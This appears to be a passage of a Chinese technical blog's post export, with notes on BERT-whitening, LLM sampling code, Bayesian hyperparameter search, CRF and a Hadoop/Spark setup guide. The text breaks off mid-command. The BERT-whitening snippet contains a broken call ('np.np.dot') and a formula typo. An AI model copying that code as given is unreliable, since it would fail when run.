Lab; Language Technologies Institute, Carnegie Mellon University Info: 类别: BERT语义表示应用优化 研究目标：将原本BERT训练模式下生成的语义表示的各向异性空间，通过设计的无监督方法，转化为各向同性的语义表示空间。 研究成果：结合Flow based model，使用无监督方式提升语义表示的效果。 存在的问题：按文章的思路，就是将BERT sentence embedding做一个转化，从非正交（orthogonal space）转化到正交的空间，以满足cos similarity适用的条件，以提高效果。但是一定需要Flow based 方法来实现吗？有没有更好的方法？ 关键词：BERT；Flow based model；semantic similarity Brief Summary: 首先解释了直接基于BERT生成的sentence embedding为什么其语义表达能力较差，然后提出一种在不引入更多监督数据条件下，提升其语义表达能力的方法，flow based model。 Outline: 搞清楚BERT-induced sentence embedding的空间有什么特性 BERT-flow怎么设计的 [来自苏剑林的质疑] BERT-flow？没必要那么复杂，BERT-whitening更优雅 Main Thought: 首先是flow based model在干什么，这首先是一个生成网络（以下图片内容来自李宏毅老师课程）： 这是一种直接在object function基础之上优化计算的方法，粗暴但是实现起来并不简单。直接从\\(\\pi(z)\\)，由设计的网络\\(x=f(z)\\)，直接逼近data分布\\(p(x)\\)。原理如下： 相应变量的微小变化，导致的面积变化是一致的。扩展到二维变量，其变化相乘变成了面积的\\(\\Delta s\\)。而矩阵的行列式就表示二维空间中图像代表的面积，所以有以下推导： 式中矩阵就是Jacobian matrix，自然得到： \\(p(x&#39;)=\\pi(z&#39;)|\\frac{1}{det(J_f)}|\\) 那么由\\(z\\)的分布就可以求出\\(x\\)的分布。只是这个网络\\(G\\)的设计有一点麻烦，需要保证参数矩阵需要是逆变换不复杂且Jacobian matrix容易计算。因为： \\(p(x&#39;)=\\pi(z&#39;)|det(J_{G^{-1}})|\\) 以及 \\(z&#39;=G^{-1}(x&#39;)\\) 都需要转化成与输入相关的函数（网络）。 同时flow的网络设计，真的是有点低效，参数空间内将参数分组进行更新。 如图，上下两部分不是同时更新，而是分步更新计算。 Key sentences: 用BERT将一个句子编码成一个固定长度的向量，方法是计算BERT最后几层中context embeddings的平均值，或者在[CLS]标记的位置提取。一般前一种方法效果更好。但是在语义表示性能上还不及averaged GloVe embeddings方法。 1. 语义相似度与BERT预训练的关系 ​ 首先，BERT将传统的auto regressive LM的目标，修改为masked predict： \\[ log(p(x_{1:T}))=\\sum_{t=1}^{T}logp(x_t|context_t) \\] 变为： \\[ p(x_{masked}|context_{of\\ masked})=\\sum_{t=1}^{T}mask_t \\times p(x_t|context_t) \\] 两者建立model的共同形式如下： \\[ p(x|context)=\\frac{\\exp(VectorFromNet_{context}^TEmbedding_x)}{\\sum_{x&#39;}\\exp(VectorFromNet_{context}^TEmbedding_{x&#39;})} \\] 这种表达形式的关键在\\(VectorFromNet_{context}^TEmbedding_x\\)，以下简单写作\\(h_c^Tw_x\\)。这篇论文证明了： \\[ h_c^Tw_x\\approx\\log p^*(x|c) + \\lambda_c=PMI(x,c)+\\log p(x)+\\lambda_c \\] ​ PMI指point wise mutual information。这种共现特征通常可以捕捉到语义信息，只是在“word”层面而言。 ​ 同时，\\(h_c\\)随着网路参数的更新而更新，不同的context在训练过程中相互影响，可视为一种高阶的high-order共现语义信息捕捉。 2. 问题所在 用BERT将一个句子编码成一个固定长度的向量，方法是计算BERT最后几层中context embeddings的平均值，或者在[CLS]标记的位置提取。一般前一种方法效果更好。但是在语义表示性能上还不及averaged GloVe embeddings方法。 为什么效果不及averaged GloVe embeddings？ 文章 How Contextual are Contextualized Word Representations? Comparing the Geometry of BERT, ELMo, and GPT-2 Embeddings 比较了预训练LM的word embedding，有如下结论： Contextualized representations(模型每一层输出)在每一个非输入层都是各向异性的，即非标准正交空间； 高层的各向异性更显著； 高层的Contextualized representations更与context相关，不同context下的数值表示相差更大。同时不同词与context相关的相关程度不同，比如，stop words与context的相关性会很大； 不同模型的每一层输出间的相关性也不同：EMLo的低层和高层的输出更相似一些；BERT的低层和高层的输出变化较大，同时句子内词的表示会更接近，和其他句子中词的表示相对更差异化一些；GPT-2的输出不同，某一个输出与当前句子内的词的相似性和当前句子之外的词的相似性，是接近的。 BERT-flow文中给出的理由： 词频差异使得低频词和高频词的学习程度不同，公式7可以作为一个依据； 低频词的表示更偏稀疏，而高频词的表示更稠密。 3. 可逆变换到standard Gaussian latent space 借鉴Glow模型的实现方式，实现flow-based generative model。将BERT参数固定，只学习可逆变换的网络参数。只使用了add coupling layer，将1x1卷积变成直接permutation。 求z为： 以上将D维向量，分为两部分计算更新。同时z的先验为标准正态分布。那么 \\(f^{-1}\\)和\\(J_{f^{-1}}\\)都是可以计算的，目标函数就可以表示。 4. Lexical Similarity在不同模型中的规律实验 论文通过一组简单的对比实验，得出以下结论： BERT-Induced Similarity的与Lexical Similarity存在着过度的相关性。 Flow-Induced Similarity 与Lexical Similarity的相关性较低。 方法是通过Similarity与Edit distance的对应关系，实验结果如图： Confusion: 正交标准化？标准化协方差矩阵？ 求一个线性变换\\(W\\)使得BERT输出的向量矩阵成一个标准化的矩阵。直接达到正交化的目的，是否也是可行？ 首先求原始协方差矩阵： \\[ \\mu=\\frac{1}{N}\\sum_{k=1}^Nxi \\] 那么 \\[ \\Sigma=\\frac{1}{N}\\sum_{k=1}^N(x_i-\\mu)^T(x_i-\\mu) \\] 变换\\(W\\)满足： \\[ W^T\\Sigma W=I \\] 其中\\(\\Sigma\\)为一个正交对称矩阵。对其SVD，有如下关系： \\[ \\Sigma=U\\Lambda U^T=(W^{-1})^TW^{-1} \\] 得到变换\\(W\\)为： \\[ W=U\\sqrt{\\Lambda^{-1}} \\] 作者实验的结果显示，该方法简洁，且效果与flow模型相差无几。 作者称该方法为BERT-whitening。 核心代码： 1234567def compute_w_bias(vecs, n_components): vecs = np.concatenate(vecs, axis=0) mu = vecs.mean(axis=0, keepdims=True) cov = np.cov(vecs.T) u, s, vh = np.linalg.svd(cov) W = np.np.dot(u, np.diag(1/np.sqrt(s))) return W[:, :n_components], -mu 标准化 1234def transform_and_normalize(vecs, kernel=None, bias=None): if not (kernel is None or bias is None): vecs = (vecs + bias).dot(kernel) return vecs / (vecs**2).sum(axis=1, keepdims=True)**0.5 实现细节 大语料计算内存问题？ 句子向量均值递归计算 \\[ \\mu_{n+1}=\\frac{n}{n+1}\\mu_n+\\frac{1}{n+1}x_{n+1} \\] 协方差递归计算 \\[ \\Sigma_{n+1}=\\frac{n}{n+1}\\Sigma_n+\\frac{1}{n+1}(x_{n+1}-\\mu)^T(x_{n+1}-\\mu) \\] BERT模型在任务数据上，先微调 论文中先在任务数据上微调，比如先进行情感分类任务，再用来计算句子向量。 flow做不到的简单的句子向量降维 SVD中直接取\\(W\\)前n个维度，即PCA，得到降维的结果。该结果将更具任务语境特征的维度提取出来。不仅提升了句子向量间相似度的速度，还可能提升预测的效果。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"},{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"}]},{"title":"语言模型Sampling方法","slug":"语言模型Sampling方法","date":"2021-01-20T06:59:46.000Z","updated":"2023-08-07T11:54:31.051Z","comments":true,"path":"posts/e798f591.html","link":"","permalink":"https://racleray.github.io/posts/e798f591.html","excerpt":"","text":"在text generation模型预测时，如果我们总是抽取最有可能的单词，标准语言模型训练目标会容易陷入“I don’t know. I don’t know. I don’t know.” 这种循环中。所以有了sample based generation方法。但是，它有一个潜在问题： 假如依照logit softmax生成的分布进行sample，假设有60%的词的概率极低以至于基本不会被选择，但是这60%的词的总的CDF占了30%，这意味着模型预测方向可能有30%的概率偏离了“正确”的方向。 而如果是在预测前期发生偏离，那么由于错误向后预测的累积，直接导致了预测的效果变差。 已有论文研究发现，经常被使用的Beam search方法，其生成效果和人类的表达有着一定的gap。 [^]: Humans often choose words that surprise language models (Holtzman et al 2019) https://arxiv.org/abs/1904.09751 解决方法：temperature sampling和top k sampling. Temperature sampling 借鉴热力学中现象，温度越高，则低energy的状态出现的概率会增加。 以logits作为“energy”，在进行softmax之前，除以temperature。 1234567891011&gt;&gt;&gt; import torch&gt;&gt;&gt; import torch.nn.functional as F&gt;&gt;&gt; a = torch.tensor([1,2,3,4.])&gt;&gt;&gt; F.softmax(a, dim=0)tensor([0.0321, 0.0871, 0.2369, 0.6439])&gt;&gt;&gt; F.softmax(a/.5, dim=0)tensor([0.0021, 0.0158, 0.1171, 0.8650])&gt;&gt;&gt; F.softmax(a/1.5, dim=0)tensor([0.0708, 0.1378, 0.2685, 0.5229])&gt;&gt;&gt; F.softmax(a/1e-6, dim=0)tensor([0., 0., 0., 1.]) NOTE：temperature越大，分布越趋向均匀 Top k sampling Top k sampling是指根据概率进行排序将第k个token以下的概率都归零。 但是存在一个问题：某些时候，分布较均匀，可以选择的token大于k；某些时候，分布较集中，可以选择的token小于k。 直接导致了预测错误的概率增大。 Top p sampling（nucleus sampling） 1，按概率sort预测分布； 2，计算CDF； 3，将CDF大于某个设定p值之后的logit值，设为一个很大的负值； 4，softmax，之后进行采样。 这样就能动态的改变可选择的token数量，且错误概率相对降低。 1234567891011121314151617181920212223242526272829303132import torchimport torch.nn.functional as Fimport numpy as npdef top_k_top_p_filtering(logits, top_k=0, top_p=0.0, filter_value=-float('Inf')): \"\"\" Filter a distribution of logits using top-k and/or nucleus (top-p) filtering Args: logits: logits distribution shape (..., vocabulary size) top_k &gt;0: keep only top k tokens with highest probability (top-k filtering). top_p &gt;0.0: keep the top tokens with cumulative probability &gt;= top_p (nucleus filtering). \"\"\" top_k = min(top_k, logits.size(-1)) # Safety check if top_k &gt; 0: # Remove all tokens with a probability less than the last token of the top-k indices_to_remove = logits &lt; torch.topk(logits, top_k)[0][..., -1, None] logits[indices_to_remove] = filter_value if top_p &gt; 0.0: sorted_logits, sorted_indices = torch.sort(logits, descending=True) cumulative_probs = torch.cumsum(F.softmax(sorted_logits, dim=-1), dim=-1) # Remove tokens with cumulative probability above the threshold sorted_indices_to_remove = cumulative_probs &gt;= top_p # Shift the indices to the right to keep also the first token above the threshold sorted_indices_to_remove[..., 1:] = sorted_indices_to_remove[..., :-1].clone() sorted_indices_to_remove[..., 0] = 0 indices_to_remove = torch.zeros_like(logits, dtype=torch.uint8).scatter_( dim=-1, index=sorted_indices, src=sorted_indices_to_remove ) logits[indices_to_remove] = filter_value return logits End 虽然有这些方法来改进模型生成的效果，但是这些仅仅是模型的“补丁”。如何提高模型本身的性能，如何让模型能够直接生成多样性的、更“人类”的语句？emmm...","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"},{"name":"sampling","slug":"sampling","permalink":"https://racleray.github.io/tags/sampling/"}]},{"title":"贝叶斯超参数搜索","slug":"贝叶斯超参数搜索","date":"2020-11-30T13:48:56.000Z","updated":"2023-08-07T11:54:31.051Z","comments":true,"path":"posts/d941eeb.html","link":"","permalink":"https://racleray.github.io/posts/d941eeb.html","excerpt":"贝叶斯方法跟踪过去的评估结果，建立形成一个概率模型，将超参数映射到目标函数上得分的概率。这个模型被称为目标函数的代理。评估目标函数后不断地更新概率模型。","text":"paper by Bergstra et al 一句话概括Bayesian hyperparameter optimization： build a probability model of the objective function and use it to select the most promising hyperparameters to evaluate in the true objective function. 常用算法：Sequential Model-Based Optimization (SMBO) with the Tree Parzen Estimator (TPE) 原理简述 贝叶斯方法相较于随机搜索和网格搜索，是更高效的。随机搜索和网格搜索根本不关注过去的结果，而是继续在整个范围内搜索，即使最优答案(可能)很明显在一个小区域内。 与随机或网格搜索相反，贝叶斯方法跟踪过去的评估结果，建立形成一个概率模型，将超参数映射到目标函数上得分的概率。这个模型被称为目标函数的代理。代理模型（也叫做响应面）又相对更容易优化。 运行过程为： 建立目标函数的替代概率模型，代理模型 查找在代理上性能最佳的超参数 将这些超参数应用于真正的目标函数 更新包含新结果的代理模型 重复步骤2-4，直到达到最大迭代次数或时间为止 贝叶斯推理的目的是通过在每次评估目标函数后不断地更新概率模型，从而获得更多的数据，减少错误。 贝叶斯优化方法是有效的，因为它们有根据的选择了下一个超参数。 基本思想是：花更多的时间选择下一个超参数，以减少对目标函数的调用。 实际上，与在目标函数中花费的时间相比，选择下一个超参数所花费的时间是很少的。 通过评估从过去的结果看似更有希望的超参数，贝叶斯方法可以在更少的迭代中找到比随机搜索更好的模型设置。 一个简单的解释如下图： 代理模型是粗黑线和器上线界细黑线组成的区域。红色虚线表示真实的目标函数。 经过贝叶斯优化几轮迭代之后，得到： 代理模型逐渐趋近目标函数。 Sequential Model-Based Optimization Sequential是指一个接一个地进行试验，每次都通过应用贝叶斯推理更新概率模型(代理)来获取更好的超参数。组成部分有： 要搜索的超参数域 以超参数为输入并输出得分的目标函数 目标函数的代理模型 一个criteria（Selection Function），称为选择函数，用于评估从替代模型中下一步要选择的超参数 该算法由（得分，超参数）对组成的历史记录，该历史对由算法用于更新代理模型 代理模型的选择有：Gaussian Processes, Random Forest Regressions, , Tree Parzen Estimators (TPE). criteria常用Expected Improvement 代理模型，也称为响应面，是利用以前的评估结果建立的目标函数的概率表示。 Expected Improvement选择函数 y* -- 目标函数的阈值 x -- 超参数组合的集合 y -- 输入x超参数得到的目标函数真实返回值 p(y | x) -- 代理模型输出的概率 其目的是最大化关于x的Expected Improvement。 如果p (y | x)在y &lt; y*处，都为零，则超参数x不会产生任何改进。 如果积分为正，则意味着超参数x预期会产生比阈值更好的结果。 Tree-structured Parzen Estimator (TPE) 使用贝叶斯公式，计算p(y | x) p (x | y)，是给定目标函数得分的超参数的概率。 对超参数做了两种不同的分布:一种是目标函数的值小于阈值，l(x)，另一种是目标函数的值大于阈值，g(x)。 结合SMBO以及一点直观的印象，我们希望从l(x)而不是从g(x)中得出x的值，因为这种分布只基于产生低于阈值得分的x的值。 最终得到的Expected Improvement： 可以发现Expected Improvement和l(x) / g(x)的比值成反比。提高EI，正是需要从l(x)中多得到p (x | y)的值。 该算法利用历史得分建立l(x)和g(x)，提出目标函数的概率模型，代理模型随着每次迭代而改进。 工具 Spearmint， MOE ： Gaussian Process (surrogate) Hyperopt ：Tree-structured Parzen Estimator Notebook示例，示例，示例 SMAC ：Random Forest regression. 都使用Expected Improvement选择函数。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"ML","slug":"Notes/ML","permalink":"https://racleray.github.io/categories/Notes/ML/"}],"tags":[{"name":"machine learning","slug":"machine-learning","permalink":"https://racleray.github.io/tags/machine-learning/"}]},{"title":"CRF--SimpleNote","slug":"CRF-SimpleNote","date":"2020-11-18T08:29:17.000Z","updated":"2023-09-23T13:45:02.173Z","comments":true,"path":"posts/798499bc.html","link":"","permalink":"https://racleray.github.io/posts/798499bc.html","excerpt":"NER标注输出不仅仅是简单的分类，而是具有一定关联规律的标注输出。CRF正是输出这种结构化结果的一种算法。结合HMM（状态转移和状态释放）和最大熵模型（log linear model建模特征函数，寻找最优的条件概率），在MEMM的基础上，建立隐变量X的概率无向图解决了MEMM的局部归一化问题。","text":"Motivation NER标注输出不仅仅是简单的分类，而是具有一定关联规律的标注输出。CRF正是输出这种结构化结果的一种算法。 结合HMM（状态转移和状态释放）和最大熵模型（log linear model建模特征函数，寻找最优的条件概率），在MEMM的基础上，建立隐变量X的概率无向图解决了MEMM的局部归一化问题。 CRF loss in Deep Learning loss的优化目标是使得模型输出的最优路径和groud truth路径尽量接近。即，最大化最优路径概率。 最优路径概率定义为， 在CRF loss中，Pi通过两组变量求得，Emission Score和Transition Score（传统CRF中的特征函数）。 Emission Score：对应神经网络输出的hidden state。可视为每一步输出标签的分类概率分布预测，每一步输出维度为[#tags, 1]。 Transition Score：对应CRF层中定义的状态转移权重矩阵。保存在CRF layer中，[#tags, #tags] 两者在深度模型中都是作为权重变量来优化学习的。 深度模型中的优化目标实际实现为： 分子计算可以简单计算发现，就是当前路径的Emission Score和Transition Score沿路径之和。计算难点在于分母，可以通过递归实现其多分支结构计算。 递归过程： 维护两个记录列表：obs和 previous。previous存储了之前步骤的结果，obs代表当前状态可能的输出选择。 以step 0到step 1为例： 扩展到#tags维度，沿着1轴，和transition matrix同维度 对score的每一列取指数，求和，在取对数，得到新的previous 递归计算，直到达到最后一个时间步。 求得分母 最佳路径导出Viterbi 动态规划算法，过程类似loss中求分母的部分，但是状态转移方程（动态规划）不同。 同样以step 0到step 1为例： 扩展到#tags维度，沿着1轴，和transition matrix同维度 previous保存的累计最优得分状态变化为： 然后保存这一轮状态转移中，不同step 0状态下对应的最优得分，以及最优得分对应的step 1最优状态。即，保存两个列表，在下一次转移时，将最优得分和对应的最优状态append到结果中。 根据最后一步的最优得分，回溯重构出最优路径。 对比MEMM 虽然CRF在MEMM的基础上，建立隐变量X的概率无向图解决了MEMM的局部归一化问题。但是，并不是说MEMM的结果就一定崩塌。 MEMM的一个明显的特点是实现简单、速度快，因为它只需要每一步单独执行softmax，所以MEMM是完全可以并行的，速度跟直接逐步Softmax基本一样。 它的每一步计算，不需要整个序列的信息计算分母，而是依赖于上一步的状态。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"},{"name":"CRF","slug":"CRF","permalink":"https://racleray.github.io/tags/CRF/"}]},{"title":"hadoop+spark环境配置","slug":"hadoop-spark环境配置","date":"2020-10-30T08:56:36.000Z","updated":"2023-08-07T11:54:31.036Z","comments":true,"path":"posts/858c7a63.html","link":"","permalink":"https://racleray.github.io/posts/858c7a63.html","excerpt":"记录 hadoop + spark 的Linux环境配置。","text":"单节点Hadoop 1.安装JDK 12345sudo apt-get updatesudo apt-get install default-jdkjava -version 查看安装路径 1update-alternatives --display java 2.设定 SSH无密码登入 123456sudo apt-get install sshsudo apt-get install rsyncssh-keygen -t dsa -P '' -f ~/.ssh/id_dsall ~/.ssh 为了无密码登录本机，加入公匙到许可证文件 1cat ~/.ssh/id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys 1systemctl restart sshd.service 3.下载安装Hadoop 1234567wget https://www.apache.org/dyn/closer.cgi/hadoop/common/hadoop-2.9.2/hadoop-2.9.2.tar.gzsudo tar -zxvf hadoop-2.9.2.tar.gzsudo mv hadoop-2.9.2 /usr/local/hadoopll /usr/local/hadoop 4.设定Hadoop环境变数 修改~/.bashrc 1sudo gedit ~/.bashrc 输入下列内容 1234567891011121314export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64export HADOOP_HOME=/usr/local/hadoopexport PATH=$PATH:$HADOOP_HOME/binexport PATH=$PATH:$HADOOP_HOME/sbinexport HADOOP_MAPRED_HOME=$HADOOP_HOMEexport HADOOP_COMMON_HOME=$HADOOP_HOMEexport HADOOP_HDFS_HOME=$HADOOP_HOMEexport YARN_HOME=$HADOOP_HOMEexport HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/nativeexport HADOOP_OPTS=\"-Djava.library.path=$HADOOP_HOME/lib\"export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH 让~/.bashrc修改生效 1source ~/.bashrc 5.修改Hadoop组态设定档 Step1 修改hadoop-env.sh配置文件 1sudo gedit /usr/local/hadoop/etc/hadoop/hadoop-env.sh 输入下列内容: 1export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 Step2 修改core-site.xml，设置HDFS名称 1sudo gedit /usr/local/hadoop/etc/hadoop/core-site.xml 在之间，输入下列内容: 123456&lt;configuration&gt;&lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; Step3 修改yarn-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/yarn-site.xml 在之间，输入下列内容: 12345678&lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;/value&gt;&lt;/property&gt; Step4 修改mapred-site.xml，监控Map和reduce程序的JobTracker 1sudo cp /usr/local/hadoop/etc/hadoop/mapred-site.xml.template /usr/local/hadoop/etc/hadoop/mapred-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/mapred-site.xml 在之间，输入下列内容: 1234&lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; Step5 修改hdfs-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/hdfs-site.xml 在之间，输入下列内容: dfs.replication设置blocks在其他节点的备份数量 12345678910111213141516&lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/namenode&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/datanode&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.http.address&lt;/name&gt; &lt;value&gt;0.0.0.0:50070&lt;/value&gt;&lt;/property&gt; 6.建立与格式化HDFS 目录 1sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/namenode 1sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode 1sudo chown ray:ray -R /usr/local/hadoop chown要根据当前用户名进行修改 格式化 1hadoop namenode -format 7.启动Hadoop 启动start-dfs.sh，再启动 start-yarn.sh 123start-dfs.shstart-yarn.sh 或 启动全部 1start-all.sh 查看目前所执行的行程 1jps stop-dfs.sh stop-yarn.sh stop-all.sh 8.开启Hadoop Resource­ManagerWeb接口 Hadoop Resource­Manager Web接口网址 http://localhost:8088/ image 9.NameNode HDFS Web接口 开启HDFS Web UI网址 http://localhost:50070/ image 多节点Hadoop 由多台电脑组成:有一台主要的电脑master，在HDFS担任NameNode角色，在MapReduce2(YARN)担任ResourceManager角色 有多台的电脑data1、data2、data3，在HDFS担任DataNode角色，在MapReduce2(YARN)担任NodeManager角色 Hadoop Multi NodeCluster规划，整理如下表格: 伺服器名称 IP HDFS YARN master 192.168.0.100 NameNode ResourceManager data1 192.168.0.101 DataNode NodeManager data2 192.168.0.102 DataNode NodeManager data3 192.168.0.103 DataNode NodeManager 1复制Single Node Cluster到data1 将之前所建立的Single Node Cluster VirtualBox hadoop虚拟机器复制到data1 2设定data1伺服器 编辑网路设定档设定固定IP 1sudo gedit /etc/network/interfaces 输入下列内容 : 123456789101112# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.101netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 1sudo vim /etc/NetworkManager/NetworkManager.conf 将managed=false修改成managed=true 1sudo service network-manager restart 重启 设定hostname 1sudo gedit /etc/hostname 输入下列内容: 1data1 设定hosts档案 1sudo gedit /etc/hosts 12345678910111213127.0.0.1 localhost127.0.1.1 hadoop192.168.0.100 master192.168.0.101 data1192.168.0.102 data2192.168.0.103 data3# The following lines are desirable for IPv6 capable hosts::1 ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters 修改core-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/core-site.xml 在之间，输入下列内容: 1234&lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://master:9000&lt;/value&gt; &lt;/property&gt; 修改yarn-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/yarn-site.xml 在之间，输入下列内容: 123456789101112&lt;property&gt; &lt;name&gt;yarn.resourcemanager.resource-tracker.address&lt;/name&gt; &lt;value&gt;master:8025&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.scheduler.address&lt;/name&gt; &lt;value&gt;master:8030&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.address&lt;/name&gt; &lt;value&gt;master:8050&lt;/value&gt; &lt;/property&gt; 修改mapred-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop /mapred-site.xml 在之间，输入下列内容: 1234&lt;property&gt; &lt;name&gt;mapred.job.tracker&lt;/name&gt; &lt;value&gt;master:54311&lt;/value&gt; &lt;/property&gt; 修改hdfs-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/hdfs-site.xml 在之间，输入下列内容: 12345678&lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/datanode&lt;/value&gt; &lt;/property&gt; 3复制data1伺服器至data2、data3、master 4设定data2、data3伺服器 设定data2固定IP 1sudo gedit /etc/network/interfaces 输入下列内容 1234567891011# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.102netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 设定hostname 1sudo gedit /etc/hostname 输入下列内容: 1data2 设定data3固定IP 1sudo gedit /etc/network/interfaces 输入下列内容 1234567891011# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.103netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 设定hostname 1sudo gedit /etc/hostname 输入下列内容: 1data3 5设定master伺服器 设定master固定IP 1sudo gedit /etc/network/interfaces 输入下列内容 1234567891011# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.100netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 设定hostname 1sudo gedit /etc/hostname 输入下列内容: 1master 修改hdfs-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/hdfs-site.xml 在之间，输入下列内容: 12345678&lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/namenode&lt;/value&gt; &lt;/property&gt; 设定master档案 1sudo gedit /usr/local/hadoop/etc/hadoop/master 输入下列内容: 1master 设定slaves档案 1sudo gedit /usr/local/hadoop/etc/hadoop/slaves 输入下列内容: 123data1data2data3 6 master连线至data1、data2、data3建立HDFS目录 master SSH连线至data1并建立HDFS目录 12345678910ssh data1# 删除hdfs目录sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# 创建datanode目录sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode# 更改所有者为当前用户sudo chown ray:ray -R /usr/local/hadoop 回到master端 1exit master SSH连线至data2并建立HDFS目录 12345678910ssh data2# 删除hdfs目录sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# 创建datanode目录sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode# 更改所有者为当前用户sudo chown ray:ray -R /usr/local/hadoop 回到master端 1exit master SSH连线至data3并建立HDFS目录 12345678910ssh data3# 删除hdfs目录sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# 创建datanode目录sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode# 更改所有者为当前用户sudo chown ray:ray -R /usr/local/hadoop 回到master端 1exit 7建立与格式化NameNode HDFS目录 12345678# 删除hdfs目录sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# 创建datanode目录sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/namenode# 更改所有者为当前用户sudo chown ray:ray -R /usr/local/hadoop 格式化NameNode HDFS目录 1hadoop namenode -format 8启动Hadoop Multi Node cluster 启动start-dfs.sh，再启动 start-yarn.sh 123start-dfs.shstart-yarn.sh 或 启动全部 1start-all.sh 查看目前所执行的行程 1jps 停止 stop-dfs.sh stop-yarn.sh stop-all.sh 9开启Hadoop Resource-Manager Web介面 http://master:8088/ image 10开启NameNodeWeb介面 HDFS Web UI网址 http://master:50070/ image image 常用命令 123456789hadoop fs -mkdirhadoop fs -lshadoop fs -copyFromLocal # 复制到hdfs，提醒有重名hadoop fs -put # 复制到hdfs，但是直接覆盖重名hadoop fs -cathadoop fs -copyToLocal # 复制到本地，提醒有重名hadoop fs -get # 复制到本地，但是直接覆盖重名hadoop fs -cphadoop fs -rm pyspark scale 12345tar xvf scala-2.11.12.tgzsudo mv scala-2.11.12 /usr/local/scalasudo gedit .bashrc 123# 写入export SCALA_HOME=/usr/local/scalaexport PATH=$PATH:$SCALA_HOME/bin spark 123tar xvf spark-2.4.7-bin-without-hadoop.tgz sudo mv spark-2.4.7-bin-without-hadoop /usr/local/sparksudo 